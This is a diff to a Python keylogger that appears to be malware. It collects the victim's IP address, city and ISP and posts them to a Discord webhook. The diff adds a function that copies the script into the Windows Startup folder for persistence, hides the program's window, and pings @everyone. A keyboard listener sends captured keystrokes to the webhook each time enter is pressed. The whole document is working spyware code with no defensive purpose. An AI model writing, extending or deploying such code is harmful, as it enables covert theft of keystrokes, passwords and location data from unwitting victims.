@@ -19,15 +19,31 @@ city = location.get("city")
 query_ip = location.get("query")
 isp = location.get("isp")
 
-#hides the program
-hide = win32gui.GetForegroundWindow()
-win32gui.ShowWindow(hide, win32con.SW_HIDE)
+#makes it start on pc start up
+def add_to_startup():
+    startup_folder = os.path.join(
+        os.environ["APPDATA"],
+        "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+    )
+    script_path = os.path.realpath(sys.argv[0])
+    target_path = os.path.join(startup_folder, os.path.basename(script_path))
 
+    if not os.path.exists(target_path):
+        shutil.copy(script_path, target_path)
+        
 #webhook sending stuff
 def send_discord_message(webhook_url, message):
     data = {"content": message}
     headers = {"Content-Type": "application/json"}
     requests.post(webhook_url, json=data, headers=headers)
+    
+payload = {
+    "content": "@everyone",
+    "allowed_mentions": {"parse": ["everyone"]}
+}
+
+#pings @everyone
+requests.post(webhook_url, json=payload)
 
 #embed where the users information is shown
 embed = {
@@ -70,6 +86,9 @@ headers = {
 }
 
 response = requests.post(webhook_url, data=json.dumps(information), headers=headers)
+hide = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(hide, win32con.SW_HIDE)
+add_to_startup()
 
 #actual logger part sends the log after the person who is getting logged presses the enter key
 def on_press(key):
@@ -89,3 +108,4 @@ def on_press(key):
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+
